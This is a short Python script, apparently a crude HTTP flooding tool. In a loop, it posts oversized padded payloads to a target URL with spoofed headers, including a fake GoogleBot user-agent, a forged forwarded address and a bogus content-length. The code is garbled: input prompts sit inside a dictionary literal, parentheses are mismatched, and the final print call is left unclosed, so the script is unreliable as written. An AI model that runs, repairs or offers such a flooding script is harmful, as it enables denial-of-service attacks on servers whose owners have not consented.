import requests,sys
url = sys.argv[1]
h = {
  "content-length" : "1000000000000000000",
  "connection" : "close",
  "user-agent" : "GoogleBot V3",
  "x-forwarded-from" : "0.0.0.0",
  "content-type" : "application/xml",
  "set-cookie" : "v=xxxxXxxxxxx;&vx=#xxxxxxxxxxxxxxxx0x;;d;"
  }
data = {
  "X" : "xXxxX",
  "Y" : "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
  IP= str(input('[+] Target: '((
  port= int(input('[+] port: '((
  }
data["Z"] = ("a" * 10000 + "b" * 10000 + "A" * 100)
for i in range(1,sys.argv[2]):
  r = requests.post(url,data=data,headers=h)
  print("Data {}, respon {}".format(i,r.status_code
